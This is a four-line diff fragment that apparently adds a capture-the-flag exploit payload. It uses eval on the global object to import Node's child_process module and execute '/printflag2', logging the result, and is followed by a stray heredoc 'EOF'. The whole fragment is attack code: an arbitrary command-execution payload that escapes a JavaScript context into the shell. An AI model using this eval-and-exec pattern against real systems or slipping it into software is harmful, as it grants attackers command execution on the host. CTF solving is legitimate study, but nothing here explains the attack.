@@ -1,0 +1,4 @@
+eval.call(global,
+    "import('child_process').then(m=>m.exec('/printflag2', console.log))"
+);
+EOF
